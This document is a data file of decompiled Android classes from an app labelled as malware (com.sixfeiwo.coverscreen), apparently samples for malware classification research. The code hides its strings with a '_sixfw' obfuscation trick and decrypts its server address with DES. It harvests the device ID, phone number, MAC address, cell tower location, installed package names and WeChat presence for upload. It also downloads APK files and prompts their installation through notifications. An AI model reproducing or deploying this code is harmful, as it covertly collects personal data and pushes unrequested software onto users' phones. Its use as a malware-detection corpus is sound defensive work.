"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.sixfeiwo.coverscreen\F.code","public final class F extends WebChromeClient {   private WA f258a;   public F(  WA wa){     this.f258a=wa;   }   @Override public final void onProgressChanged(  WebView webView,  int i){     this.f258a.setProgress(i * 100);     WA.a(this.f258a,""å·²åŠ è½½ >> _sixfw"".replace(""_sixfw"","""") + i + ""%"");     if (i >= 100) {       WA.a(this.f258a,null);     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.sixfeiwo.coverscreen\G.code","public final class G extends WebViewClient {   private WA f259a;   public G(  WA wa){     this.f259a=wa;   }   @Override public final void onPageFinished(  WebView webView,  String str){     this.f259a.f274a.getSettings().setBlockNetworkImage(false);     super.onPageFinished(webView,str);   }   @Override public final void onReceivedError(  WebView webView,  int i,  String str,  String str2){     if (this.f259a.b.equalsIgnoreCase(str2) || (this.f259a.b + ""/"").equalsIgnoreCase(str2)) {       this.f259a.f274a.loadData(""<h1>Page load Error !</h1>_sixfw"".replace(""_sixfw"",""""),""text/html_sixfw"".replace(""_sixfw"",""""),""UTF-8_sixfw"".replace(""_sixfw"",""""));       this.f259a.c=true;     }     WA.a(this.f259a,""åŠ è½½å¤±è´¥_sixfw"".replace(""_sixfw"",""""));   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.sixfeiwo.coverscreen\H.code","public class H {   private int f260a;   private String b;   private String c;   private String d;   private String e;   public H(){   }   public H(  int i,  String str,  String str2,  String str3,  String str4){     this.f260a=i;     this.b=str;     this.c=str2;     this.d=str3;     this.e=str4;   }   public static JSONObject a(  Context context,  double d,  double d2,  String str,  int i,  String str2,  String str3){     String a2=ag.a(context);     String c=J.a(context).c();     String d3=J.a(context).d();     String b=J.a(context).b();     String a3=J.a(context).a();     String c2=ag.c(context);     JSONObject jSONObject=new JSONObject();     try {       jSONObject.put(""devid_sixfw"".replace(""_sixfw"",""""),a2);       jSONObject.put(""adid_sixfw"".replace(""_sixfw"",""""),str2);       jSONObject.put(""appkey_sixfw"".replace(""_sixfw"",""""),str);       jSONObject.put(""type_sixfw"".replace(""_sixfw"",""""),0);       jSONObject.put(""lat_sixfw"".replace(""_sixfw"",""""),0.0d);       jSONObject.put(""lon_sixfw"".replace(""_sixfw"",""""),0.0d);       jSONObject.put(""cellid_sixfw"".replace(""_sixfw"",""""),c);       jSONObject.put(""lac_sixfw"".replace(""_sixfw"",""""),d3);       jSONObject.put(""mcc_sixfw"".replace(""_sixfw"",""""),a3);       jSONObject.put(""mnc_sixfw"".replace(""_sixfw"",""""),b);       jSONObject.put(""wifi_sixfw"".replace(""_sixfw"",""""),c2);       jSONObject.put(""url_sixfw"".replace(""_sixfw"",""""),str3);       jSONObject.put(""adsdkversion_sixfw"".replace(""_sixfw"",""""),S.f269a);       jSONObject.put(""sdktype_sixfw"".replace(""_sixfw"",""""),S.b);       jSONObject.put(""svt_sixfw"".replace(""_sixfw"",""""),S.c);     }  catch (    JSONException e) {     }     return jSONObject;   }   public static JSONObject a(  Context context,  int i){     String a2=ag.a(context);     JSONObject jSONObject=new JSONObject();     try {       jSONObject.put(""devid_sixfw"".replace(""_sixfw"",""""),a2);       jSONObject.put(""adid_sixfw"".replace(""_sixfw"",""""),i);       jSONObject.put(""adsdkversion_sixfw"".replace(""_sixfw"",""""),S.f269a);       jSONObject.put(""sdktype_sixfw"".replace(""_sixfw"",""""),S.b);       jSONObject.put(""svt_sixfw"".replace(""_sixfw"",""""),S.c);     }  catch (    JSONException e) {     }     return jSONObject;   }   public static JSONObject a(  Context context,  String str){     String a2=ag.a(context);     String b=J.a(context).b();     String a3=ag.a();     am d=ag.d(context);     af.a();     boolean a4=af.a(context,""com.tencent.mm_sixfw"".replace(""_sixfw"",""""));     int b2=P.b(context);     String c=J.a(context).c();     String d2=J.a(context).d();     String str2=(ao.a(c) || ao.a(d2)) ? """" : c + "":"" + d2;     String c2=ag.c(context);     String b3=ag.b();     JSONObject jSONObject=new JSONObject();     try {       jSONObject.put(""adsdkversion_sixfw"".replace(""_sixfw"",""""),str);       jSONObject.put(""devid_sixfw"".replace(""_sixfw"",""""),a2);       jSONObject.put(""brand_sixfw"".replace(""_sixfw"",""""),a3);       jSONObject.put(""model_sixfw"".replace(""_sixfw"",""""),b3);       jSONObject.put(""latlon_sixfw"".replace(""_sixfw"",""""),""0:0"");       jSONObject.put(""cidlac_sixfw"".replace(""_sixfw"",""""),str2);       jSONObject.put(""wifi_sixfw"".replace(""_sixfw"",""""),c2);       jSONObject.put(""mnc_sixfw"".replace(""_sixfw"",""""),b);       jSONObject.put(""width_sixfw"".replace(""_sixfw"",""""),d.f287a);       jSONObject.put(""weixinflag_sixfw"".replace(""_sixfw"",""""),a4);       jSONObject.put(""networktype_sixfw"".replace(""_sixfw"",""""),b2);       jSONObject.put(""sdktype_sixfw"".replace(""_sixfw"",""""),S.b);       jSONObject.put(""svt_sixfw"".replace(""_sixfw"",""""),S.c);     }  catch (    JSONException e) {     }     return jSONObject;   }   public static JSONObject a(  Context context,  String str,  String str2){     JSONObject jSONObject=new JSONObject();     String a2=ag.a(context);     String b=ag.b();     af.a();     String a3=af.a(context,false);     String str3=ag.d(context).f287a + ""*"" + ag.d(context).b;     String a4=ag.a();     String d=ag.d();     String c=ag.c();     String c2=J.a(context).c();     String b2=J.a(context).b();     String e=J.a(context).e();     am d2=ag.d(context);     String str4=d2.f287a + ""*"" + d2.b;     String b3=ag.b(context);     String c3=ag.c(context);     try {       jSONObject.put(""devid_sixfw"".replace(""_sixfw"",""""),a2);       jSONObject.put(""model_sixfw"".replace(""_sixfw"",""""),b);       jSONObject.put(""packagenames_sixfw"".replace(""_sixfw"",""""),a3);       jSONObject.put(""resolution_sixfw"".replace(""_sixfw"",""""),str3);       jSONObject.put(""brand_sixfw"".replace(""_sixfw"",""""),a4);       jSONObject.put(""versionrelease_sixfw"".replace(""_sixfw"",""""),d);       jSONObject.put(""versioncode_sixfw"".replace(""_sixfw"",""""),c);       jSONObject.put(""appkey_sixfw"".replace(""_sixfw"",""""),str);       jSONObject.put(""adsdkversion_sixfw"".replace(""_sixfw"",""""),str2);       jSONObject.put(""sdktype_sixfw"".replace(""_sixfw"",""""),S.b);       jSONObject.put(""wifi_sixfw"".replace(""_sixfw"",""""),c3);       jSONObject.put(""call_id_sixfw"".replace(""_sixfw"",""""),c2);       jSONObject.put(""mac_sixfw"".replace(""_sixfw"",""""),b3);       jSONObject.put(""screen_size_sixfw"".replace(""_sixfw"",""""),str4);       jSONObject.put(""mobile_num_sixfw"".replace(""_sixfw"",""""),e);       jSONObject.put(""mnc_sixfw"".replace(""_sixfw"",""""),b2);       jSONObject.put(""svt_sixfw"".replace(""_sixfw"",""""),S.c);     }  catch (    JSONException e2) {     }     return jSONObject;   }   public static JSONObject a(  Context context,  String str,  JSONArray jSONArray){     String a2=ag.a(context);     JSONObject jSONObject=new JSONObject();     try {       jSONObject.put(""adsdkversion_sixfw"".replace(""_sixfw"",""""),str);       jSONObject.put(""devid_sixfw"".replace(""_sixfw"",""""),a2);       jSONObject.put(""installCount_sixfw"".replace(""_sixfw"",""""),jSONArray);       jSONObject.put(""sdktype_sixfw"".replace(""_sixfw"",""""),S.b);       jSONObject.put(""svt_sixfw"".replace(""_sixfw"",""""),S.c);     }  catch (    JSONException e) {     }     return jSONObject;   }   public String a(){     return this.b;   }   public String b(){     return this.c;   }   public String c(){     return this.d;   }   public String d(){     return this.e;   }   public int e(){     return this.f260a;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.sixfeiwo.coverscreen\I.code","public final class I {   private static final String f261a=R.a(""H8Zno4EBTQx9HFCC0rcAQqd931fYhjBLaFEZBiEdBCo=_sixfw"".replace(""_sixfw"",""""),R.a(""123456_sixfw"".replace(""_sixfw"","""")));   public static String a(){     return f261a + ""/webviewAdClick_sixfw"".replace(""_sixfw"","""");   }   public static String b(){     return f261a + ""/showCount_sixfw"".replace(""_sixfw"","""");   }   public static String c(){     return f261a + ""/"" + ""clientinfo_sixfw"".replace(""_sixfw"","""");   }   public static String d(){     return f261a + ""/installCount_sixfw"".replace(""_sixfw"","""");   }   public static String e(){     return f261a + ""/getCoverScreenAdList_sixfw"".replace(""_sixfw"","""");   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.sixfeiwo.coverscreen\J.code","public class J {   private static J f262a;   private String b;   private String c;   private String d;   private String e;   private String f;   public J(){   }   private J(  Context context){     try {       TelephonyManager telephonyManager=(TelephonyManager)context.getSystemService(""phone_sixfw"".replace(""_sixfw"",""""));       String networkOperator=telephonyManager.getNetworkOperator();       this.b=networkOperator.substring(0,3);       this.c=networkOperator.substring(3);       if (telephonyManager.getCellLocation() instanceof CdmaCellLocation) {         CdmaCellLocation cdmaCellLocation=(CdmaCellLocation)telephonyManager.getCellLocation();         this.d=String.valueOf(cdmaCellLocation.getBaseStationId());         this.e=String.valueOf(cdmaCellLocation.getNetworkId());         this.f=telephonyManager.getLine1Number();       }  else       if (telephonyManager.getCellLocation() instanceof GsmCellLocation) {         GsmCellLocation gsmCellLocation=(GsmCellLocation)telephonyManager.getCellLocation();         this.d=String.valueOf(gsmCellLocation.getCid());         this.e=String.valueOf(gsmCellLocation.getLac());         this.f=telephonyManager.getLine1Number();       }     }  catch (    Exception e) {       e.getStackTrace();     }   }   public static J a(  Context context){     if (f262a == null) {       f262a=new J(context);     }     return f262a;   }   public String a(){     return this.b;   }   public String b(){     return this.c;   }   public String c(){     return this.d;   }   public String d(){     return this.e;   }   public String e(){     return ao.a(this.f) ? """" : this.f;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.sixfeiwo.coverscreen\K.code","public final class K {   private static K f263a=null;   private ExecutorService b;   private Map c=new HashMap();   private int d=0;   private int e=0;   private K(){     this.b=null;     this.b=Executors.newFixedThreadPool(5);   }   public static K a(){     if (f263a == null) {       f263a=new K();     }     return f263a;   }   public static void a(  String str,  String str2){     HttpURLConnection httpURLConnection;     HttpURLConnection httpURLConnection2;     FileOutputStream fileOutputStream;     FileOutputStream fileOutputStream2=null;     r2=null;     fileOutputStream2=null;     HttpURLConnection httpURLConnection3=null;     FileOutputStream fileOutputStream3=null;     File file=new File(str2 + ""."" + System.currentTimeMillis()+ "".temp_sixfw"".replace(""_sixfw"",""""));     File file2=new File(str2);     if (file2.exists()) {       return;     }     try {       httpURLConnection2=(HttpURLConnection)new URL(str).openConnection();       try {         httpURLConnection2.setConnectTimeout(20000);         httpURLConnection2.setReadTimeout(20000);         httpURLConnection2.setRequestMethod(""GET_sixfw"".replace(""_sixfw"",""""));         httpURLConnection2.connect();         InputStream inputStream=httpURLConnection2.getInputStream();         FileOutputStream fileOutputStream4=new FileOutputStream(file);         try {           byte[] bArr=new byte[1024];           while (true) {             int read=inputStream.read(bArr);             if (read == -1) {               break;             }  else {               fileOutputStream4.write(bArr,0,read);             }           }           fileOutputStream4.flush();           fileOutputStream4.close();           file.renameTo(file2);           try {             fileOutputStream4.close();             if (httpURLConnection2 != null) {               httpURLConnection2.disconnect();             }           }  catch (          IOException e) {           }         }  catch (        FileNotFoundException e2) {           httpURLConnection3=httpURLConnection2;           fileOutputStream=fileOutputStream4;           if (fileOutputStream != null) {             try {               fileOutputStream.close();             }  catch (            IOException e3) {               return;             }           }           if (httpURLConnection3 != null) {             httpURLConnection3.disconnect();           }         } catch (        IOException e4) {           fileOutputStream3=fileOutputStream4;           if (fileOutputStream3 != null) {             try {               fileOutputStream3.close();             }  catch (            IOException e5) {               return;             }           }           if (httpURLConnection2 != null) {             httpURLConnection2.disconnect();           }         } catch (        Throwable th) {           fileOutputStream2=fileOutputStream4;           httpURLConnection=httpURLConnection2;           th=th;           if (fileOutputStream2 != null) {             try {               fileOutputStream2.close();             }  catch (            IOException e6) {               throw th;             }           }           if (httpURLConnection != null) {             httpURLConnection.disconnect();           }           throw th;         }       }  catch (      FileNotFoundException e7) {         httpURLConnection3=httpURLConnection2;         fileOutputStream=null;       } catch (      IOException e8) {       } catch (      Throwable th2) {         httpURLConnection=httpURLConnection2;         th=th2;       }     }  catch (    FileNotFoundException e9) {       fileOutputStream=null;     } catch (    IOException e10) {       httpURLConnection2=null;     } catch (    Throwable th3) {       th=th3;       httpURLConnection=null;     }   }   public final Bitmap a(  Context context,  String str){     int i;     Bitmap bitmap;     int i2;     if (!new File(str).exists()) {       return null;     }     BitmapFactory.Options options=new BitmapFactory.Options();     options.inJustDecodeBounds=true;     BitmapFactory.decodeFile(str,options);     int i3=options.outWidth;     int i4=options.outHeight;     int i5=i3;     int i6=1;     while (true) {       int i7=i4;       int i8=i5 / 2;       if (this.d > 0) {         i=this.d;       }  else {         DisplayMetrics displayMetrics=new DisplayMetrics();         ((WindowManager)context.getSystemService(""window_sixfw"".replace(""_sixfw"",""""))).getDefaultDisplay().getMetrics(displayMetrics);         this.d=displayMetrics.widthPixels;         i=displayMetrics.widthPixels;       }       if (i8 <= i) {         break;       }       int i9=i7 / 2;       if (this.e > 0) {         i2=this.e;       }  else {         DisplayMetrics displayMetrics2=new DisplayMetrics();         ((WindowManager)context.getSystemService(""window_sixfw"".replace(""_sixfw"",""""))).getDefaultDisplay().getMetrics(displayMetrics2);         this.e=displayMetrics2.heightPixels;         i2=this.e;       }       if (i9 <= i2) {         break;       }       i5/=2;       i4=i7 / 2;       i6<<=1;     }     options.inPurgeable=true;     options.inInputShareable=true;     options.inSampleSize=i6;     options.inJustDecodeBounds=false;     File file=new File(str);     if (file.exists()) {       bitmap=BitmapFactory.decodeFile(str,options);       if (bitmap == null) {         file.delete();       }     }  else {       bitmap=null;     }     return bitmap;   }   public final Drawable a(  Context context,  String str,  String str2){     if (str == null || str.equals("""")) {       return null;     }     File file=new File(str2);     if (!file.exists()) {       return null;     }     try {       file.setLastModified(System.currentTimeMillis());       return new BitmapDrawable(a(context,str2));     }  catch (    Exception e) {       return null;     } catch (    OutOfMemoryError e2) {       return null;     }   }   public final Drawable a(  Context context,  String str,  String str2,  N n){     if (this.c.containsKey(str)) {       SoftReference softReference=(SoftReference)this.c.get(str);       if (softReference.get() != null) {         if (0 != 0) {           softReference.get();         }         return (Drawable)softReference.get();       }     }     this.b.submit(new M(this,context,str,str2,true,new L(this,null,str)));     return null;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.sixfeiwo.coverscreen\L.code","final class L extends Handler {   private N f264a;   private String b;   public L(  K k,  N n,  String str){     this.f264a=n;     this.b=str;   }   @Override public final void handleMessage(  Message message){     if (message.obj == null || this.f264a == null) {       return;     }     N n=this.f264a;     Object obj=message.obj;     String str=this.b;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.sixfeiwo.coverscreen\M.code","public final class M implements Runnable {   private Context f265a;   private String b;   private String c;   private boolean d;   private Handler e;   private K f;   public M(  K k,  Context context,  String str,  String str2,  boolean z,  Handler handler){     this.f=k;     this.f265a=context;     this.b=str;     this.c=str2;     this.d=z;     this.e=handler;   }   @Override public final void run(){     Map map;     Drawable a2=this.f.a(this.f265a,this.b,this.c);     new StringBuilder().append(""loadDrawable from method: getDrawableFromCache, drawable: "").append(a2).append("", url: "").append(this.b);     if (a2 == null) {       try {         new StringBuilder().append(""save to file start: "").append(this.c).append("", url: "").append(this.b);         K k=this.f;         Context context=this.f265a;         K.a(this.b,this.c);         a2=this.f.a(this.f265a,this.b,this.c);       }  catch (      IOException e) {         a2=null;         new StringBuilder().append(""save to file failed: "").append(this.c).append("", url: "").append(this.b);       }     }     if (this.d && a2 != null) {       map=this.f.c;       map.put(this.b,new SoftReference(a2));     }     this.e.sendMessage(this.e.obtainMessage(0,a2));   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.sixfeiwo.coverscreen\N.code","public interface N { } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.sixfeiwo.coverscreen\NewAc.code","public class NewAc {   public static void AnzInt(  final Context ctx,  String azkey){     CPManager.init(ctx,azkey);     new Handler().postDelayed(new Runnable(){       @Override public void run(){         CPManager.showAd(ctx);       }     } ,8000L);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.sixfeiwo.coverscreen\O.code","public final class O {   private static final char[] f266a=""ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"".toCharArray();   private static final int[] b;   private static final byte[] c; static {     int[] iArr=new int[256];     b=iArr;     Arrays.fill(iArr,-1);     int length=f266a.length;     for (int i=0; i < length; i++) {       b[f266a[i]]=i;     }     b[61]=0;     byte[] bArr={65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,48,49,50,51,52,53,54,55,56,57,43,47};     c=new byte[128];     for (int i2=0; i2 < 128; i2++) {       c[i2]=-1;     }     for (int i3=65; i3 <= 90; i3++) {       c[i3]=(byte)(i3 - 65);     }     for (int i4=97; i4 <= 122; i4++) {       c[i4]=(byte)((i4 - 97) + 26);     }     for (int i5=48; i5 <= 57; i5++) {       c[i5]=(byte)((i5 - 48) + 52);     }     c[43]=62;     c[47]=63;   }   public static final String a(  byte[] bArr,  boolean z){     return new String(b(bArr,z));   }   public static final byte[] a(  java.lang.String r10){     throw new UnsupportedOperationException(""Method not decompiled: com.sixfeiwo.coverscreen.O.a(java.lang.String):byte[]"");   }   private static char[] b(  byte[] bArr,  boolean z){     int length=bArr != null ? bArr.length : 0;     if (length == 0) {       return new char[0];     }     int i=(length / 3) * 3;     int i2=(((length - 1) / 3) + 1) << 2;     int i3=i2 + (z ? ((i2 - 1) / 76) << 1 : 0);     char[] cArr=new char[i3];     int i4=0;     int i5=0;     int i6=0;     while (i6 < i) {       int i7=i6 + 1;       int i8=i7 + 1;       int i9=((bArr[i7] & 255) << 8) | ((bArr[i6] & 255) << 16);       i6=i8 + 1;       int i10=i9 | (bArr[i8] & 255);       int i11=i5 + 1;       cArr[i5]=f266a[(i10 >>> 18) & 63];       int i12=i11 + 1;       cArr[i11]=f266a[(i10 >>> 12) & 63];       int i13=i12 + 1;       cArr[i12]=f266a[(i10 >>> 6) & 63];       i5=i13 + 1;       cArr[i13]=f266a[i10 & 63];       if (z && (i4=i4 + 1) == 19 && i5 < i3 - 2) {         int i14=i5 + 1;         cArr[i5]='\r';         cArr[i14]='\n';         i5=i14 + 1;         i4=0;       }     }     int i15=length - i;     if (i15 > 0) {       int i16=(i15 == 2 ? (bArr[length - 1] & 255) << 2 : 0) | ((bArr[i] & 255) << 10);       cArr[i3 - 4]=f266a[i16 >> 12];       cArr[i3 - 3]=f266a[(i16 >>> 6) & 63];       cArr[i3 - 2]=i15 == 2 ? f266a[i16 & 63] : '=';       cArr[i3 - 1]='=';     }     return cArr;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.sixfeiwo.coverscreen\P.code","public class P {   static P f267a;   ConcurrentLinkedQueue b;   Map c;   Context d;   Handler e;   public P(){   }   private P(  Context context){     this.b=new ConcurrentLinkedQueue();     this.c=new ConcurrentHashMap();     this.d=context;     this.e=new Handler();   }   public static P a(){     if (f267a == null) {       throw new RuntimeException(""DownloadManager is not yet initialize_sixfw"".replace(""_sixfw"",""""));     }     return f267a;   }   public static boolean a(  Context context){     NetworkInfo activeNetworkInfo=((ConnectivityManager)context.getSystemService(""connectivity"")).getActiveNetworkInfo();     return activeNetworkInfo != null && activeNetworkInfo.isConnected();   }   public static int b(  Context context){     boolean z=true;     NetworkInfo activeNetworkInfo=((ConnectivityManager)context.getSystemService(""connectivity"")).getActiveNetworkInfo();     if (activeNetworkInfo == null || !activeNetworkInfo.isConnected()) {       return 0;     }     String typeName=activeNetworkInfo.getTypeName();     if (typeName.equalsIgnoreCase(""WIFI_sixfw"".replace(""_sixfw"",""""))) {       return 4;     }     if (!typeName.equalsIgnoreCase(""MOBILE_sixfw"".replace(""_sixfw"",""""))) {       return 0;     }     if (!ao.a(Proxy.getDefaultHost())) {       return 1;     } switch (((TelephonyManager)context.getSystemService(""phone"")).getNetworkType()) { case 1:       z=false;     break; case 2:   z=false; break; case 4: z=false; break; case MotionEventCompat.ACTION_HOVER_MOVE: z=false; break; case 11: z=false; break; } return z ? 3 : 2; } public static void c(Context context){ f267a=new P(context); } public void a(H h){ new StringBuilder().append(""[DownloadManager] removeTask: "").append(h.a()).append("","").append(h.d()); this.c.remove(h.d()); } public void a(H h,T t){ new StringBuilder().append(""[DownloadManager] addTask: "").append(h.a()).append("","").append(h.d()); U u=(U)this.c.get(h.d()); if (u != null) { u.a(t); return; } U u2=new U(this,h,t); this.c.put(h.d(),u2); u2.start(); } public boolean a(String str){ return this.c.containsKey(str); } public void b(){ U u=(U)this.b.poll(); while (u != null) { a(u.b,(T)u.f271a.poll()); u=(U)this.b.poll(); } } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.sixfeiwo.coverscreen\Q.code","public final class Q implements Serializable {   public static final String f268a=""download_sixfw"".replace(""_sixfw"","""");   public static final String b=""weixin_sixfw"".replace(""_sixfw"","""");   public static final String c=""weburl_sixfw"".replace(""_sixfw"","""");   private int d;   private int e;   private String f;   private String g;   private String h;   private String i;   private String j;   private String k;   private String l;   private String m;   private String n;   private String o;   private String p;   private String q;   private String r;   private String s;   private String t;   public static Q a(  JSONObject jSONObject){     if (jSONObject == null) {       return null;     }     Q q=new Q();     q.d=jSONObject.optInt(""id_sixfw"".replace(""_sixfw"",""""));     q.e=jSONObject.optInt(""adid_sixfw"".replace(""_sixfw"",""""),0);     q.f=jSONObject.optString(""image_sixfw"".replace(""_sixfw"",""""));     q.g=jSONObject.optString(""name_sixfw"".replace(""_sixfw"",""""));     q.i=jSONObject.optString(""icon_sixfw"".replace(""_sixfw"",""""));     q.q=jSONObject.optString(""coverDownloadConfirm_sixfw"".replace(""_sixfw"",""""),""true_sixfw"".replace(""_sixfw"",""""));     q.r=jSONObject.optString(""notifiKeep_sixfw"".replace(""_sixfw"",""""),""true_sixfw"".replace(""_sixfw"",""""));     q.s=jSONObject.optString(""gprsDown_sixfw"".replace(""_sixfw"",""""),""true_sixfw"".replace(""_sixfw"",""""));     q.h=jSONObject.optString(""clickType_sixfw"".replace(""_sixfw"",""""));     q.t=jSONObject.optString(""fullClick_sixfw"".replace(""_sixfw"",""""),""true"");     q.l=jSONObject.optString(""appicon_sixfw"".replace(""_sixfw"",""""));     q.m=jSONObject.optString(""appname_sixfw"".replace(""_sixfw"",""""));     q.n=jSONObject.optString(""apppackage_sixfw"".replace(""_sixfw"",""""));     q.o=jSONObject.optString(""appurl_sixfw"".replace(""_sixfw"",""""));     q.p=jSONObject.optString(""appsize_sixfw"".replace(""_sixfw"",""""));     q.j=jSONObject.optString(""wxurl_sixfw"".replace(""_sixfw"",""""));     q.k=jSONObject.optString(""weburl_sixfw"".replace(""_sixfw"",""""));     return q;   }   public final int a(){     return this.e;   }   public final String b(){     return this.f;   }   public final String c(){     return this.g;   }   public final String d(){     return this.m;   }   public final String e(){     return this.n;   }   public final String f(){     return this.o;   }   public final String g(){     return this.j;   }   public final String h(){     return this.h;   }   public final String i(){     return this.k;   }   public final String j(){     return this.i;   }   public final String k(){     return this.l;   }   public final String l(){     return this.p;   }   public final int m(){     return this.d;   }   public final String n(){     return this.q;   }   public final String o(){     return this.r;   }   public final String p(){     return this.s;   }   public final String q(){     return this.t;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.sixfeiwo.coverscreen\R.code","public final class R { static {     ""CryptUtils.java_sixfw"".replace(""_sixfw"","""");     char[] cArr={'0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f'};   }   public static String a(  String str){     StringBuffer stringBuffer=new StringBuffer();     stringBuffer.append(str.substring(0,4));     stringBuffer.append(str.substring(str.length() - 4));     return stringBuffer.toString();   }   public static String a(  String str,  String str2){     if (str == null) {       return null;     }     return new String(c(str,str2));   }   public static String a(  String str,  String str2,  boolean z){     if (str == null) {       return null;     }     return O.a(b(str,str2),false);   }   private static byte[] b(  String str,  String str2){     if (str == null) {       return null;     }     try {       SecretKeySpec secretKeySpec=new SecretKeySpec(str2.getBytes(),""DES_sixfw"".replace(""_sixfw"",""""));       Cipher cipher=Cipher.getInstance(""DES_sixfw"".replace(""_sixfw"",""""));       byte[] bytes=str.getBytes(""utf-8_sixfw"".replace(""_sixfw"",""""));       cipher.init(1,secretKeySpec);       return cipher.doFinal(bytes);     }  catch (    UnsupportedEncodingException e) {       return null;     } catch (    InvalidKeyException e2) {       return null;     } catch (    NoSuchAlgorithmException e3) {       return null;     } catch (    BadPaddingException e4) {       return null;     } catch (    IllegalBlockSizeException e5) {       return null;     } catch (    NoSuchPaddingException e6) {       return null;     }   }   private static byte[] c(  String str,  String str2){     if (str == null) {       return null;     }     try {       SecretKeySpec secretKeySpec=new SecretKeySpec(str2.getBytes(),""DES_sixfw"".replace(""_sixfw"",""""));       Cipher cipher=Cipher.getInstance(""DES_sixfw"".replace(""_sixfw"",""""));       byte[] a2=O.a(str);       cipher.init(2,secretKeySpec);       return cipher.doFinal(a2);     }  catch (    InvalidKeyException e) {       return null;     } catch (    NoSuchAlgorithmException e2) {       return null;     } catch (    BadPaddingException e3) {       return null;     } catch (    IllegalBlockSizeException e4) {       return null;     } catch (    NoSuchPaddingException e5) {       return null;     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.sixfeiwo.coverscreen\RunnableC0007f.code","public final class RunnableC0007f implements Runnable {   private String f292a;   private AbstractC0002a b;   public RunnableC0007f(  AbstractC0002a abstractC0002a,  String str){     this.b=abstractC0002a;     this.f292a=str;   }   @Override public final void run(){     Context context;     ah a2=ah.a();     context=this.b.d;     a2.a(context,this.f292a,(ak)null);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.sixfeiwo.coverscreen\RunnableC0008g.code","public final class RunnableC0008g implements Runnable {   private String f293a;   private AbstractC0002a b;   public RunnableC0008g(  AbstractC0002a abstractC0002a,  String str){     this.b=abstractC0002a;     this.f293a=str;   }   @Override public final void run(){     Context context;     ah a2=ah.a();     context=this.b.d;     a2.a(context,this.f293a,(ak)null);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.sixfeiwo.coverscreen\RunnableC0009h.code","public final class RunnableC0009h implements Runnable {   private Intent f294a;   private AbstractC0002a b;   public RunnableC0009h(  AbstractC0002a abstractC0002a,  Intent intent){     this.b=abstractC0002a;     this.f294a=intent;   }   @Override public final void run(){     Context context;     context=this.b.d;     context.startActivity(this.f294a);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.sixfeiwo.coverscreen\RunnableC0013l.code","final class RunnableC0013l implements Runnable {   private SA f298a;   public RunnableC0013l(  SA sa){     this.f298a=sa;   }   @Override public final void run(){     SA.a(this.f298a);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.sixfeiwo.coverscreen\RunnableC0014m.code","final class RunnableC0014m implements Runnable {   private SA f299a;   public RunnableC0014m(  SA sa){     this.f299a=sa;   }   @Override public final void run(){     SA.a(this.f299a);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.sixfeiwo.coverscreen\RunnableC0016o.code","final class RunnableC0016o implements Runnable {   private String f301a;   private H b;   private C0015n c;   public RunnableC0016o(  C0015n c0015n,  String str,  H h){     this.c=c0015n;     this.f301a=str;     this.b=h;   }   @Override public final void run(){     Intent intent=new Intent(""android.intent.action.VIEW"");     intent.addFlags(268435456);     intent.setDataAndType(Uri.fromFile(new File(this.f301a)),""application/vnd.android.package-archive_sixfw"".replace(""_sixfw"",""""));     ac.a(this.c.f300a.b).a(this.b.e() + 12345,android.R.drawable.ic_menu_share,this.b.a(),this.b.a(),""ä¸‹è½½å®Œæˆ�ï¼Œç‚¹å‡»å®‰è£…_sixfw"".replace(""_sixfw"",""""),intent,34,this.b.b(),System.currentTimeMillis());   } } "
